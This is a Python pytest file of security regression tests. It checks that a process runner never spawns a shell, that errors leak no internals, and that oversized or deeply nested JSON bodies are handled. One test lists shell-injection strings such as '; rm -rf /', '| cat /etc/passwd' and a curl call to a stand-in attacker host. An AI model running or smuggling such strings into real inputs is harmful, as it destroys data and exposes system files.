"""Security-focused regression tests (issue #95).

These tests assert security *properties* rather than functional behaviour:

1. Command injection — server config values must reach the OS as literal
   argv, never interpreted by a shell.
2. Error-response leakage — HTTP error responses must not expose stack
   traces or internal filesystem paths.
3. Payload hardening — oversized and malformed/deeply-nested request
   bodies must be rejected or handled without crashing the process.

Profile-name path traversal (the fourth category in #95) is already
covered by `apps/airis-commands/src/lib.test.ts` via `validateProfileName`.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest
from starlette.applications import Starlette
from starlette.responses import JSONResponse, PlainTextResponse
from starlette.routing import Route
from starlette.testclient import TestClient

import app.core.process_runner as process_runner_module
from app.core.process_runner import ProcessConfig, ProcessRunner
from app.middleware.request_size import RequestSizeLimitMiddleware


def _assert_no_internal_details(body: str) -> None:
    """Fail if an HTTP response body exposes server internals."""
    lowered = body.lower()
    for needle in ("traceback", "site-packages", "/app/src", "/usr/lib/python"):
        assert needle not in lowered, f"response leaked internal detail: {needle!r}"


# ── 1. Command injection resistance ──────────────────────────────────────────


@pytest.mark.asyncio
async def test_start_process_passes_server_args_as_literal_argv(monkeypatch):
    """Shell metacharacters in server args must be passed as literal argv.

    asyncio.create_subprocess_exec does not spawn a shell, so metacharacters
    are inert. This test pins that contract: each payload string arrives as
    its own argv element, unconcatenated and unexpanded.
    """
    malicious_args = [
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "| cat /etc/passwd",
        "&& curl http://evil.example.com",
    ]
    runner = ProcessRunner(
        ProcessConfig(name="injection-probe", command="echo", args=malicious_args)
    )

    captured: dict[str, tuple] = {}

    async def _fake_exec(*args, **kwargs):
        captured["args"] = args
        fake_proc = MagicMock()
        fake_proc.pid = 4242
        return fake_proc

    monkeypatch.setattr(
        process_runner_module.asyncio, "create_subprocess_exec", _fake_exec
    )
    # Background readers would otherwise run against the mocked process.
    monkeypatch.setattr(runner, "_stdout_reader", AsyncMock())
    monkeypatch.setattr(runner, "_stderr_reader", AsyncMock())
    monkeypatch.setattr(runner, "_idle_reaper", AsyncMock())

    await runner._start_process()

    # argv is exactly [command, *args] — nothing merged into a shell string.
    assert list(captured["args"]) == ["echo", *malicious_args]
    # The metacharacters survive verbatim, proving no shell expansion occurred.
    assert "$(whoami)" in captured["args"]
    assert "; rm -rf /" in captured["args"]

    for task in (runner._reader_task, runner._stderr_task, runner._reaper_task):
        if task is not None:
            task.cancel()


def test_process_runner_module_never_spawns_a_shell():
    """Regression guard: the module must not switch to a shell-based spawn."""
    source = Path(process_runner_module.__file__).read_text()
    assert "create_subprocess_shell" not in source
    assert "shell=True" not in source


# ── 2. Error-response leakage ────────────────────────────────────────────────


def test_app_debug_mode_disabled():
    """Debug mode makes Starlette echo stack traces into HTTP responses."""
    from app.main import app

    assert app.debug is False


def test_unknown_route_404_does_not_leak_internals():
    """A 404 for an unknown path must not expose paths or stack traces."""
    from app.main import app

    client = TestClient(app, raise_server_exceptions=False)
    response = client.get("/nonexistent-path-for-security-test")

    assert response.status_code == 404
    _assert_no_internal_details(response.text)


# ── 3. Payload hardening ─────────────────────────────────────────────────────


def _build_json_echo_app(max_size: int | None = None) -> Starlette:
    """Build a minimal app that parses a JSON body, optionally size-limited."""

    async def echo(request):
        await request.json()
        return JSONResponse({"ok": True})

    async def ping(_request):
        return PlainTextResponse("pong")

    app = Starlette(
        routes=[
            Route("/echo", echo, methods=["POST"]),
            Route("/ping", ping, methods=["GET"]),
        ]
    )
    if max_size is not None:
        app.add_middleware(RequestSizeLimitMiddleware, max_size=max_size)
    return app


def test_oversized_payload_rejected():
    """RequestSizeLimitMiddleware rejects bodies over the configured limit."""
    client = TestClient(
        _build_json_echo_app(max_size=1024), raise_server_exceptions=False
    )

    response = client.post("/echo", content=b"x" * 4096)

    assert response.status_code == 413
    assert response.json()["error"] == "payload_too_large"


def test_normal_payload_passes_size_check():
    """A small body is allowed through the size limit."""
    client = TestClient(
        _build_json_echo_app(max_size=1024), raise_server_exceptions=False
    )

    response = client.post("/echo", json={"hello": "world"})

    assert response.status_code == 200


def test_malformed_json_does_not_crash_server():
    """Invalid JSON yields an error response and leaves the server responsive."""
    client = TestClient(_build_json_echo_app(), raise_server_exceptions=False)

    response = client.post(
        "/echo",
        content=b"{not valid json",
        headers={"content-type": "application/json"},
    )

    assert response.status_code >= 400
    _assert_no_internal_details(response.text)
    # The process survived and still serves other requests.
    assert client.get("/ping").status_code == 200


def test_deeply_nested_json_does_not_crash_server():
    """A deeply nested payload must not crash or hang the process.

    Whether the JSON parser accepts the payload or rejects it with a
    RecursionError, the security-critical property is the same: the request
    returns a bounded HTTP response (no hang), leaks no internals, and the
    worker stays responsive (no crash). Unbounded-depth DoS is additionally
    capped by the request size limit exercised above.
    """
    depth = 5000
    payload = ("[" * depth) + ("]" * depth)
    client = TestClient(_build_json_echo_app(), raise_server_exceptions=False)

    response = client.post(
        "/echo",
        content=payload.encode(),
        headers={"content-type": "application/json"},
    )

    # A response came back at all — the request did not hang.
    assert response.status_code in range(200, 600)
    _assert_no_internal_details(response.text)
    # The process survived and still serves other requests.
    assert client.get("/ping").status_code == 200
